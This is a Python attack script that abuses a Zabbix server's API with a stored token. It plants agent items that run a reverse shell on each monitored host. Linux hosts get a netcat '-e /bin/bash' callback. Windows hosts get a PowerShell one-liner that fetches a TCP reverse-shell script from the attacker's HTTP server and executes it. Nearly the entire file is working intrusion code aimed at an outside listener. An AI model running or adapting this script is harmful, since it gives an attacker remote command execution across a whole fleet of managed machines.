import requests
import json
import base64
import os
import subprocess
import time
ZABBIX_URL = 'http://192.168.25.3:8080/api_jsonrpc.php'
HEADERS = {'Content-Type': 'application/json'}
AUTH_TOKEN = 'APITOKENxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'
IP_SHELL = "10.10.100.6"
PORT_SERVER_PYTHON = 9000
PALAVRAS_CHAVE_LINUX = [
    "Server_linux", "linux", "ubuntu", "debian", "centos",
    "redhat", "arch", "fedora", "suse",
    "unix", "kali", "mint"
]


def payload_win(port_shell):
    payload_win = f"""
    do {{
        Start-Sleep -Seconds 1
        try {{
            $ClienteTCP = New-Object Net.Sockets.TCPClient("{IP_SHELL}", {port_shell})
        }} catch {{}}
    }} until ($ClienteTCP.Connected)

    $FluxoDeRede = $ClienteTCP.GetStream()
    $EscritorDeFluxo = New-Object IO.StreamWriter($FluxoDeRede)

    function EscreverNoFluxo ($Texto) {{
        [byte[]]$script:BufferDeRecepcao = 0..$ClienteTCP.ReceiveBufferSize | % {{0}}
        $EscritorDeFluxo.Write($Texto + 'SHELL> ')
        $EscritorDeFluxo.Flush()
    }}

    EscreverNoFluxo ''

    while(($BytesLidos = $FluxoDeRede.Read($BufferDeRecepcao, 0, $BufferDeRecepcao.Length)) -gt 0) {{
        $ComandoRecebido = ([text.encoding]::UTF8).GetString($BufferDeRecepcao, 0, $BytesLidos - 1)
        $SaidaDeComando = try {{
            Invoke-Expression $ComandoRecebido 2>&1 | Out-String
        }} catch {{
            $_ | Out-String
        }}
        EscreverNoFluxo ($SaidaDeComando)
    }}

    $EscritorDeFluxo.Close()
    """

    shell = f"""
    powershell -ep Bypass {payload_win}
    """

    with open("shell.ps1", 'w') as f:  
        f.write(shell)



def iniciar_servidor_http(PORT_SERVER_PYTHON):
    """Inicia um servidor HTTP na pasta atual."""
    return subprocess.Popen(["python3", "-m", "http.server", str(PORT_SERVER_PYTHON)], cwd=os.getcwd())


iniciar_servidor_http(PORT_SERVER_PYTHON)

def listar_interface_host(auth_token):
    data = {
        "jsonrpc": "2.0",
        "method": "host.get",
        "params": {
            "output": [
                "hostid",
                "host"
            ],
            "selectInterfaces": [
                "interfaceid",
                "ip"
            ]
        },
        "auth": auth_token,
        "id": 2
    }

    response = requests.post(ZABBIX_URL, headers=HEADERS, data=json.dumps(data))

    if response.status_code != 200:
        print(f"Erro ao conectar na API: {response.status_code}, {response.text}")
        return None

    response_data = response.json()

    if "result" not in response_data:
        print(f"Erro na resposta da API: {response_data}")
        return None

    return response_data


# Função para verificar e excluir item existente
def verificar_e_excluir_item(auth_token, hostid, name):
    payload_get = {
        "jsonrpc": "2.0",
        "method": "item.get",
        "params": {
            "output": ["itemid"],
            "hostids": hostid,
            "search": {
                "name": name
            }
        },
        "auth": auth_token,
        "id": 3
    }
    response = requests.post(ZABBIX_URL, headers=HEADERS, data=json.dumps(payload_get))
    items = response.json().get('result', [])
    
    if items:
        item_ids = [item['itemid'] for item in items]
        payload_delete = {
            "jsonrpc": "2.0",
            "method": "item.delete",
            "params": item_ids,
            "auth": auth_token,
            "id": 4
        }
        delete_response = requests.post(ZABBIX_URL, headers=HEADERS, data=json.dumps(payload_delete))
        print(f"Itens excluídos: {delete_response.json()}")


# Função para criar o item no host
def write_code_in_host_linux(auth_token, hostid, interfaceid, ip_shell, port_ip):
    name = "nc trad"
    verificar_e_excluir_item(auth_token, hostid, name)  # Excluir item existente, se houver
    
    payload_create = {
        "jsonrpc": "2.0",
        "method": "item.create",
        "params": {
            "name": name,
            "key_": f"system.run[nc.traditional {ip_shell} {port_ip} -e /bin/bash ,nowait]",
            "hostid": hostid,
            "type": 0,  # Zabbix agent
            "value_type": 3,  # Tipo de retorno (3 significa log)
            "interfaceid": interfaceid,
            "delay": "60s"
        },
        "auth": auth_token,
        "id": 5
    }
    response = requests.post(ZABBIX_URL, headers=HEADERS, data=json.dumps(payload_create))
    print(f"Item criado: {response.json()}")



def write_code_in_host_win(auth_token, hostid, interfaceid,IP_SHELL):
    name = "powershell_simple"
    verificar_e_excluir_item(auth_token, hostid, name)  # Excluir item existente, se houver
    
    payload_create = {
        "jsonrpc": "2.0",
        "method": "item.create",
        "params": {
            "name": name,
            "key_": f"system.run[powershell -Command \"(New-Object Net.WebClient).DownloadString('http://{IP_SHELL}:{PORT_SERVER_PYTHON}/shell.ps1') | Invoke-Expression\",nowait]",
            "hostid": hostid,
            "type": 0,  # Zabbix agent
            "value_type": 3,  # Tipo de retorno (3 significa log)
            "interfaceid": interfaceid,
            "delay": "60s"
        },
        "auth": auth_token,
        "id": 5
    }
    response = requests.post(ZABBIX_URL, headers=HEADERS, data=json.dumps(payload_create))
    print(f"Item criado: {response.json()}")
    

def main():
    try:
        response_data = listar_interface_host(AUTH_TOKEN)
        if response_data and "result" in response_data:
            for host in response_data['result']:
                hostid = host['hostid']
                hostname = host['host']
                interfaceid = host['interfaces'][0]['interfaceid']
                
                while True:
                    print(f"\nHost: {hostname}")
                    print("Escolha o tipo de payload:")
                    print("1 - Linux")
                    print("2 - Windows")
                    print("3 - Proxima")
                    opcao = input("Digite sua escolha (1, 2 ou 3): ")

                    if opcao in ["1", "2", "3"]:
                        break
                    else:
                        print("Opção inválida. Por favor, escolha 1 para Linux, 2 para Windows ou 3 para próximo.")

                if opcao == "3":
                    print("Passando para o próximo host...")
                    continue  # Pula para o próximo host
                
                try:
                    porta = int(input(f"Digite a porta para o host '{hostname}': "))
                except ValueError:
                    print("Porta inválida! Por favor, insira um número inteiro.")
                    continue

                # Aguarda confirmação do usuário
                input(f"Pressione ENTER para continuar com o host '{hostname}' na porta {porta}...")

                # Configura payloads para sistemas Linux ou Windows
                if opcao == "1":
                    write_code_in_host_linux(AUTH_TOKEN, hostid, interfaceid, IP_SHELL, porta)
                elif opcao == "2":
                    payload_win(porta)
                    write_code_in_host_win(AUTH_TOKEN, hostid, interfaceid, IP_SHELL)

    except Exception as e:
        print(f"Ocorreu um erro: {e}")


if __name__ == "__main__":
    main()
